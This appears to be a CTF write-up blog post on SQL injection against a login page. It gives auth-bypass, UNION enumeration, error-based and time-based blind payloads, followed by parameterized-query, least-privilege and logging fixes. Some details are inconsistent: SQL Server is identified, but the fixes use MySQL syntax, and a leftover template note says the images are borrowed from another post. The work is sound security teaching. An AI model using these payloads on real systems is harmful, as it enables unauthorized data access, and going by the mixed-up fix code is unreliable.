---
slug: "sql-injection-walkthrough"
title: "SQL Injection CTF: Database Enumeration and Flag Extraction"
date: "2025-02-01"
category: "ctf"
tags:
  - "CTF"
  - "Web Security"
  - "SQL Injection"
  - "Database"
excerpt: "A comprehensive walkthrough demonstrating SQL injection techniques to enumerate database structure and extract sensitive information from a vulnerable web application."
readTime: "15 min"
featured: true
---

<!-- 
IMAGE USAGE NOTES:
- Place images in: public/images/blog/{your-post-slug}/
- Reference them as: /images/blog/{your-post-slug}/figure1.png
- After adding images, update lib/images.ts to include your post's image paths
- Current template uses actual images from local-authority post as examples
-->

## Introduction

This CTF challenge presents a web application vulnerable to SQL injection. The objective is to **identify the vulnerability, enumerate the database structure, and extract the flag**. This walkthrough demonstrates practical SQL injection techniques and their real-world implications.

---

## Initial Reconnaissance

### Landing Page Analysis

Upon visiting the challenge website, we encounter a simple login page with username and password fields.

![Login page interface](/images/blog/local-authority/figure1.png)

### Testing Basic Functionality

I first tested the application with standard credentials to understand its behavior:

- Username: `admin`
- Password: `test123`

The application returned a generic "Invalid credentials" message, which is a good security practice (not revealing whether the username exists).

![Failed login attempt](/images/blog/local-authority/figure2.png)

---

## Discovery Phase

### Identifying the Vulnerability

I attempted a basic SQL injection payload in the username field:

```
Username: admin'--
Password: anything
```

The application successfully logged in, confirming a SQL injection vulnerability.

![Successful SQL injection](/images/blog/local-authority/figure3.png)

### Understanding the Query Structure

Based on the successful injection, the underlying SQL query likely looks like:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comment operator effectively nullifies the password check, allowing authentication bypass.

---

## Database Enumeration

### Determining Database Type

I used various techniques to identify the database management system:

**MySQL/PostgreSQL Test:**
```
Username: admin' AND 1=1--
```

**SQL Server Test:**
```
Username: admin'; WAITFOR DELAY '00:00:05'--
```

The delay confirmed we're dealing with **SQL Server**.

### Extracting Database Information

#### Getting Database Name

```
Username: admin' UNION SELECT NULL, db_name(), NULL--
```

This revealed the database name: `ctf_challenge_db`

#### Enumerating Tables

```
Username: admin' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_type='BASE TABLE'--
```

This query returned several tables:
- `users`
- `flags`
- `admin_logs`

#### Examining Table Structure

```
Username: admin' UNION SELECT NULL, column_name, data_type FROM information_schema.columns WHERE table_name='flags'--
```

The `flags` table structure:
- `id` (int)
- `flag_value` (varchar)
- `created_at` (datetime)

---

## Exploitation

### Extracting the Flag

With the table structure known, I extracted the flag:

```
Username: admin' UNION SELECT NULL, flag_value, NULL FROM flags--
```

The query successfully returned the flag: `HTB{sql_injection_master_2024}`

![Flag extraction](/images/blog/local-authority/figure4.png)

### Alternative Extraction Methods

#### Using Error-Based Injection

```
Username: admin' AND 1=CONVERT(int, (SELECT flag_value FROM flags))--
```

This technique leverages SQL Server's error messages to extract data when UNION queries are blocked.

#### Using Time-Based Blind Injection

```
Username: admin'; IF (SELECT SUBSTRING(flag_value, 1, 1) FROM flags) = 'H' WAITFOR DELAY '00:00:05'--
```

This method extracts data character by character using time delays, useful when direct output is not available.

---

## Why the Exploit Worked

### Root Cause Analysis

#### 1. Unsanitized User Input

The application directly concatenated user input into SQL queries without proper sanitization or parameterization:

```php
$query = "SELECT * FROM users WHERE username = '" . $_POST['username'] . "' AND password = '" . $_POST['password'] . "'";
```

#### 2. Lack of Input Validation

No server-side validation was performed on user inputs, allowing special SQL characters to be processed.

#### 3. Excessive Error Information

The application provided detailed error messages that aided in database enumeration and exploitation.

#### 4. Insufficient Access Controls

The database user had excessive privileges, allowing access to system tables like `information_schema`.

### Attack Vector Summary

1. **Input**: Malicious SQL payload in username field
2. **Processing**: Application concatenates input into SQL query
3. **Execution**: Database executes modified query
4. **Result**: Unauthorized data access and authentication bypass

---

## Secure Fixes and Mitigations

### Immediate Actions

#### 1. Use Parameterized Queries (Prepared Statements)

**Vulnerable Code:**
```php
$query = "SELECT * FROM users WHERE username = '" . $username . "'";
$result = mysqli_query($conn, $query);
```

**Secure Code:**
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

#### 2. Input Validation and Sanitization

Implement strict input validation:

```php
function validateInput($input) {
    // Remove special characters
    $input = filter_var($input, FILTER_SANITIZE_STRING);
    // Validate length
    if (strlen($input) > 50) {
        return false;
    }
    return $input;
}
```

#### 3. Principle of Least Privilege

Configure database users with minimal required permissions:

```sql
-- Create restricted user
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT ON ctf_challenge_db.users TO 'app_user'@'localhost';
-- Revoke access to system tables
REVOKE SELECT ON information_schema.* FROM 'app_user'@'localhost';
```

#### 4. Error Handling

Implement generic error messages:

```php
try {
    // Database operations
} catch (Exception $e) {
    // Log detailed error internally
    error_log($e->getMessage());
    // Show generic message to user
    die("An error occurred. Please try again later.");
}
```

#### 5. Web Application Firewall (WAF)

Deploy a WAF to filter malicious SQL injection patterns:

- Block common SQL keywords in user input
- Implement rate limiting
- Monitor and alert on suspicious patterns

#### 6. Regular Security Audits

- Perform periodic penetration testing
- Use automated SQL injection scanners
- Review code for security vulnerabilities
- Keep database software updated

---

## Detection and Monitoring

### Indicators of Compromise

Monitor for these suspicious patterns:

- Unusual database query patterns
- Multiple failed login attempts with SQL-like strings
- Unexpected database errors in logs
- Unusual data access patterns
- Performance degradation (time-based attacks)

### Logging Recommendations

```php
// Log all authentication attempts
$log_entry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip_address' => $_SERVER['REMOTE_ADDR'],
    'username' => $username,
    'success' => $login_success,
    'user_agent' => $_SERVER['HTTP_USER_AGENT']
];
file_put_contents('auth.log', json_encode($log_entry) . "\n", FILE_APPEND);
```

---

## Key Takeaways

**TL;DR**: The application was vulnerable to SQL injection due to unsanitized user input being directly concatenated into SQL queries. This allowed complete database enumeration and unauthorized data access.

**Critical Lessons**:

1. **Never trust user input** - Always validate and sanitize
2. **Use parameterized queries** - The most effective defense against SQL injection
3. **Implement defense in depth** - Multiple security layers
4. **Follow least privilege** - Limit database user permissions
5. **Monitor and log** - Detect attacks early
6. **Regular testing** - Find vulnerabilities before attackers do

---

## Conclusion

SQL injection remains one of the most critical web application vulnerabilities, consistently ranking in the OWASP Top 10. This CTF challenge demonstrates how a simple oversight in input handling can lead to complete database compromise.

The techniques shown here are not just theoretical - they represent real attack vectors used by malicious actors. Understanding these vulnerabilities is the first step in building secure applications.

**Remember**: Security is not a feature to add later; it must be built into the application from the ground up. Always use secure coding practices, perform regular security audits, and stay informed about emerging threats.

---

## Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQL Injection Detection Tools](https://owasp.org/www-community/Vulnerability_Scanning_Tools)
